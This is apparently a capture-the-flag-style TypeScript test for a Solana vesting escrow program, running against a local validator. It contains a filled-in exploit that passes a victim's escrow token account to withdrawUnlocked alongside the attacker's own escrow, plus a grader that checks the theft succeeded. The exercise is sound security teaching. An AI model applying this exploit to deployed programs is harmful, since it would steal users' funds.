import * as anchor from "@coral-xyz/anchor";
import { Program, BN } from "@coral-xyz/anchor";
import {
  TOKEN_PROGRAM_ID,
  createMint,
  createAccount,
  mintTo,
  getAccount,
} from "@solana/spl-token";
import {
  Keypair,
  SystemProgram,
} from "@solana/web3.js";
import { assert } from "chai";
import { FuzzExample3 } from "../target/types/fuzz_example3";


describe("Exploit Stealing", async () => {
  let provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);
  let exploitSuccessful = false;

  const program = anchor.workspace.FuzzExample3 as Program<FuzzExample3>;
  const payer = Keypair.generate();
  const sender = Keypair.generate();
  const recipient = Keypair.generate();
  const hacker = Keypair.generate();
  const escrow = Keypair.generate();
  let mint, senderTokenAccount, recipientTokenAccount, hackerTokenAccount, escrowTokenAccount, escrowPdaAuthority;
  const INITIAL_TOKENS_BALANCE = 1000000000;

  before("Setup", async () => {
    await airdrop(provider.connection, payer.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await airdrop(provider.connection, sender.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await airdrop(provider.connection, recipient.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);

    mint = await createMint(
      provider.connection,
      payer,
      payer.publicKey,
      null,
      9,
    );

    senderTokenAccount = await createAccount(provider.connection, sender, mint, sender.publicKey);
    recipientTokenAccount = await createAccount(provider.connection, recipient, mint, recipient.publicKey);
    hackerTokenAccount = await createAccount(provider.connection, hacker, mint, hacker.publicKey);
    escrowTokenAccount = await createAccount(provider.connection, sender, mint, sender.publicKey, anchor.web3.Keypair.generate());

    // Mint tokens to sender's token account
    await mintTo(
      provider.connection,
      payer,
      mint,
      senderTokenAccount,
      payer,
      INITIAL_TOKENS_BALANCE
    );

    // Mint tokens to hacker's token account
    await mintTo(
      provider.connection,
      payer,
      mint,
      hackerTokenAccount,
      payer,
      INITIAL_TOKENS_BALANCE
    );
  });


  let now = new BN(+new Date() / 1000); // current time in seconds
  const amount = new BN(2001000); // amount to vest
  const start = now.subn(10000); // start vesting in the past so that we do not need to wait
  const end = now; // end now so that we do not need to wait to withdraw whole vested amount
  const interval = new BN(5); // unlock new amount every X seconds

  it("Initialize vesting!", async () => {
    const [escrow, escrow_bump] = anchor.web3.PublicKey.findProgramAddressSync([recipient.publicKey.toBuffer(), anchor.utils.bytes.utf8.encode("ESCROW_SEED")], program.programId);

    const tx = await program.methods
      .initVesting(recipient.publicKey, amount, start, end, interval)
      .accounts({
        sender: sender.publicKey,
        senderTokenAccount: senderTokenAccount,
        escrow: escrow,
        escrowTokenAccount: escrowTokenAccount,
        mint: mint,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([sender])
      .rpc();
  });

  it("Hacker tries to steal tokens!", async () => {

    // x x x x x x x x x x x x x x x x x x x x x
    // | | | | | | | | | | | | | | | | | | | | |
    //           EDIT THE CODE BELOW
    // | | | | | | | | | | | | | | | | | | | | |
    // v v v v v v v v v v v v v v v v v v v v v


    hackerTokenAccount;
    hacker;

    const escrowTokenAccountHacker = await createAccount(provider.connection, hacker, mint, hacker.publicKey, anchor.web3.Keypair.generate());
    // const escrowHacker = anchor.web3.Keypair.generate();

    const amount = new BN(200);
    const start = now.subn(10);
    const end = now;
    const interval = new BN(5); // charging interval 2 seconds

    const [escrowHacker, escrow_bump] = anchor.web3.PublicKey.findProgramAddressSync([hacker.publicKey.toBuffer(), anchor.utils.bytes.utf8.encode("ESCROW_SEED")], program.programId);


    const tx = await program.methods
      .initVesting(hacker.publicKey, amount, start, end, interval)
      .accounts({
        sender: hacker.publicKey,
        senderTokenAccount: hackerTokenAccount,
        escrow: escrowHacker,
        escrowTokenAccount: escrowTokenAccountHacker,
        mint: mint,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([hacker])
      .rpc();

    await program.methods.withdrawUnlocked()
      .accounts(
        {
          recipient: hacker.publicKey,
          recipientTokenAccount: hackerTokenAccount,
          escrow: escrowHacker,
          escrowTokenAccount: escrowTokenAccount,
          escrowPdaAuthority: escrowPdaAuthority,
          mint: mint,
          tokenProgram: TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        }
      )
      .signers([hacker])
      .rpc({ commitment: "confirmed" });

    // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
    // | | | | | | | | | | | | | | | | | | | | |
    //           EDIT THE CODE ABOVE
    // | | | | | | | | | | | | | | | | | | | | |
    // x x x x x x x x x x x x x x x x x x x x x
  });


  it("Bug evaluation", async () => {
    exploitSuccessful = false;

    let now = new BN(+new Date() / 1000);
    if (now < end) {
      await countDown(end.sub(now).toNumber(), 1);
    }

    const [escrow, escrow_bump] = anchor.web3.PublicKey.findProgramAddressSync([recipient.publicKey.toBuffer(), anchor.utils.bytes.utf8.encode("ESCROW_SEED")], program.programId);

    try {
      await program.methods.withdrawUnlocked()
        .accounts(
          {
            recipient: recipient.publicKey,
            recipientTokenAccount: recipientTokenAccount,
            escrow: escrow,
            escrowTokenAccount: escrowTokenAccount,
            escrowPdaAuthority: escrowPdaAuthority,
            mint: mint,
            tokenProgram: TOKEN_PROGRAM_ID,
            systemProgram: SystemProgram.programId,
          }
        )
        .signers([recipient])
        .rpc({ commitment: "confirmed" });
      assert.fail("You did not succeed to hack the program! Recipient was able to withdraw the total vested amount!");
    }
    catch (err) {
      let hackerTokenBalance = (await getAccount(provider.connection, hackerTokenAccount)).amount;
      if (hackerTokenBalance > INITIAL_TOKENS_BALANCE) {
        exploitSuccessful = true;
      }
      else {
        assert.fail("You did not succeed to hack the program! Hacker was not able to withdraw more than his initial deposit!");
      }
    }

  });

  after("Evaluation", async () => {
    if (exploitSuccessful) {
      console.log('\n\n\x1b[32m', 'CONGRATULATIONS!!!\nYou succeeded to steal funds from someone else!', '\x1b[0m')
    }
    else {
      console.log('\n\n\x1b[31m', 'You did not suceed to exploit the program!', '\x1b[0m')
    }

  });
});


async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}

async function sleep(seconds) {
  return new Promise((resolve) => setTimeout(resolve, seconds * 1000));
}

async function countDown(duration, update) {
  if (duration < update) {
    await sleep(duration);
  }
  else {
    let iters = Math.ceil(duration / update);
    let elapsed = 0;
    for (let i = 0; i < iters; i++) {
      process.stdout.write("Waiting " + (duration - elapsed) + " seconds until the vesting expires...")
      await sleep(update);
      elapsed = elapsed + update;
      process.stdout.clearLine(0);
      process.stdout.cursorTo(0);
    }

  }
}
